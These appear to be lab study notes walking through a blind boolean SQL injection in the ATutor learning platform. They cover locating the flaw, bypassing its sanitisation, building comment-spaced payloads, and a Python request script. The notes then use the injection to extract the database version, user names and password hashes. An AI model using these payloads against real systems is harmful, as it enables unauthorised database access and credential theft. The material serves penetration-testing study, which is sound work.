# SQL Injection

# Initial Vulnerability Discovery

## Finding Publicly Accessible Webpages

Pages that do not require authentication have the line: `$_user_location = 'public';`

- This finds the webpage `/mods/_standard/social/index_public.php`

```bash
Search:
grep -rnw /var/www/html/ATutor -e "^.*user_location.*public.*" --color
```

## Looking for SQLi

- When looking through the code, we see variable names such as query, qry, search or other functions. We should look through the path of these function calls to discover where it leads, as it may lead to improperly handled user data.

```bash
nano ./ATutor/mods/_standard/social/index_public.php
```

- In this case, it leads to the `searchFriends` function, which uses the `$addslashes`function for sanitation.
- Get funciton definition of searchFriends:

```bash
grep -rnw . -e "function searchFriends' --color
```

- User controlled `$name` variable is exploded into an array called `$sub_names` using space as separator.
- For each element of `$sub_names`, the element is concatenated into a string containing SQL LIKE keyword and incorporated into SQL query `$query`
- These `$query` variables are concatenated to form the final SQL query.
- When we send a GET request terminated by a single quote, we get a HTTP request error.

```bash
Warning:  Invalid argument supplied for foreach() in /var/www/html/ATutor/mods/_standard/social/lib/friends.inc.php on line 350
```

```bash
import sys
import re
import requests
from bs4 import BeautifulSoup

def searchFriends_sqli(ip, inj_str):
    target = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, inj_str)
    r = requests.get(target)
    s = BeautifulSoup(r.text, 'lxml')
    print "Response Headers:"
    print r.headers
    print
    print "Response Content:"
    print s.text
    print
    error = re.search("Invalid argument", s.text)
    if error:
        print "Errors found in response. Possible SQL injection found"
    else:
        print "No errors found"

def main():
    if len(sys.argv) != 3:
        print "(+) usage: %s <target> <injection_string>" % sys.argv[0]
        print '(+) eg: %s 192.168.121.103 "aaaa\'" '  % sys.argv[0]
        sys.exit(-1)

    ip                  = sys.argv[1]
    injection_string    = sys.argv[2]

    searchFriends_sqli(ip, injection_string)

if __name__ == "__main__":
    main()
```

- We can tail the mysql log file to get the query that was sent

```bash
776 Query	SELECT * FROM AT_members M WHERE (first_name LIKE '%AAAA'%'  OR second_name LIKE '%AAAA'%'  OR last_name LIKE '%AAAA'%'  OR login LIKE '%AAAA'%'  )
```

- After which, we send 2 single quotes and are able to close the SQL query with no errors in the response and the MySQL log file

## Discovering SQLi

- Cannot just use a UNION-based SQLi since the results of the vulnerable query are not displayed to the user.
- Output of the query are passed to the `printSocialName` function, and then uses PHP echo to return the `member_id` back to the user. `printSocialName` will pass the `member_id` to `get_display_name`, which prepares and executes the final query using the `$member_id` parameter.

# Sanitation Bypass

- This application is using a function named `$addslashes` rather than the PHP native `addslashes` function.

```bash
egrep '\$addslashes.*=.*' /var/www/html/ATutor -r --color
```

- The function is dependent on the `get_magic_quotes_gpc` function, and we can use a custom PHP script to dump the results of that function.

```bash
student@atutor:~$ cat /var/www/html/magic.php
<?php
var_dump(get_magic_quotes_gpc());
?>

student@atutor:~$ curl http://localhost/magic.php
bool(false)
```

- This is because magic quotes are deprecated since version 5.4.0 of PHP, but the current version is 5.6.17.
- Since the result is false, this means that `$addslashes` will fall through and become the trim function.

## QueryDB

- The query DB function takes in a variable `$sql` and an array of parameters `params`. However, in `friends.inc.php`, the array passed into params is empty and the entire string is passed as `$sql`, which is not sanitized. As such, the query is not actually being sanitized.

```bash
$rows_members = queryDB($sql, array()); 
```

# Constructing Payload

## Payload Constraints

- Payload cannot contain spaces since they are used to split in the query construction process
- Replace spaces with anything that constitutes a valid space substitute in MySQL syntax, which includes inline comments `select/**/1`
- Create a dummy TRUE/FALSE injection subquery.

```bash
true_injection_string = "aaaa')/**/or/**/(select/**/1)=1%23"
false_injection_string = "aaaa')/**/or/**/(select/**/1)=0%23"
```

- We can now begin to use boolean-based SQLi to get information from database, starting with version number (refer to [version.py](https://github.com/dvdg6566/oswe/blob/main/labs/atutor/version.py) script)
    - Using `ascii()` conversion converts special characters into their ascii values, allowing us to send payloads without using special characters, which could sometimes lead to errors or filters.

```bash
Version: 5.5.47-0+deb8u1-log
"test')/**/or/**/(ascii(substring((select/**/version()),{i},1)))={c}%23"

CURRENT_USER(): root@localhost
"test')/**/or/**/(ascii(substring((select/**/CURRENT_USER()),{i},1)))={c}%23"
```

## Extra Mile Exercise

*Given everything you have learned about type juggling, recreate the compromise of the "teacher" account using the "Forgot Password" function **WITHOUT** updating the email address*

- We can also inject using the `search_friends` parameter. Code has to be modified to return false if the `content_lengtht`is less than 6100.
    - Even when there is significant amount of noise, should play around with a few different payloads to try to differentiate FALSE from TRUE.
- Alternatively, there exists a POST exploit as well.
    - The code `isset($_POST['search_friends_'.$rand_key]))` concatenates `$rand_key` behind the string `search_friends_` and checks the POST field.

Vulnerable Code:

```bash
if(isset($_POST['rand_key'])){    
				$rand_key = $addslashes($_POST['rand_key']);        //should we excape?
}

i**f((isset($rand_key) && $rand_key!='**' && isset($_POST['search_friends_'.$rand_key])) || isset($_GET['search_friends'])){
        if (empty($_POST['search_friends_'.$rand_key]) && !isset($_GET['search_friends'])){
                $msg->addError('CANNOT_BE_EMPTY');                
								header('Location: '.url_rewrite(AT_SOCIAL_BASENAME.'index_public.php', AT_PRETTY_URL_IS_HEADER));
                exit;        
				}        
				//to adapt paginator GET queries
				if(isset($_GET['search_friends'])){
                $search_field = $addslashes($_GET['search_friends']);
        } else {                
								$search_field = $addslashes($_POST['search_friends_'.$rand_key]);
        }        
				if (isset($_POST['myFriendsOnly'])){
                //retrieve a list of my friends
                $friends = searchFriends($search_field, true);
        } else {
                //retrieve a list of friends by the search
                $friends = searchFriends($search_field);
				        // to calculate the total number. TODO: need a better way, wasting runtime.
                $num_pages = max(ceil(sizeof($friends) / SOCIAL_FRIEND_SEARCH_MAX), 1);
                $friends = searchFriends($search_field, false, $offset);
        }
}
```

Exploit Code (Refer to [extra_mile_3.5.py](https://github.com/dvdg6566/oswe/blob/main/labs/atutor/extra_mile_3.5.py))

- Must add content-type (because post requests) and send the payload as `data` object.
- Must remember not to URL encode special characters.

```bash
target = f"http://{ip}/ATutor/mods/_standard/social/index_public.php"

headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}

myobj = {
    "rand_key": "x",
    "search_friends_x": inj_str
}

r = requests.post(target, headers=headers, data = myobj)
s = BeautifulSoup(r.text, 'lxml')

true_injection_string = "aaaa')/**/or/**/(select/**/1)=1#"
false_injection_string = "aaaa')/**/or/**/(select/**/1)=0#"
```

# Obtaining Hashes

- Database Schema

```bash
Admins table: AT_admins;
Users table: AT_members;

Columns with credentials are login and password. 
```

- Member table

```bash
Query String: "select/**/login/**/FROM/**/AT_members"
Result: teacher

Query String: f"select/**/password/**/FROM/**/AT_members/**/WHERE/**/login=\"{username}\""
Result hash: 8635fc4e2a0c7d9d2d9ee40ea8bf2edd76d5757e
```

- Admin table

```bash
Query String: "select/**/login/**/FROM/**/AT_admins"
Result: teacher

Query String: f"select/**/password/**/FROM/**/AT_admins/**/WHERE/**/login=\"{username}\""
Result hash: f865b53623b121fd34ee5426c792e5c33af8c227
```

If more users are present, likely can use some form of LIMITs to choose which user to dump. 

- Can use `count(*)` SQL injections to check the number of items in table.
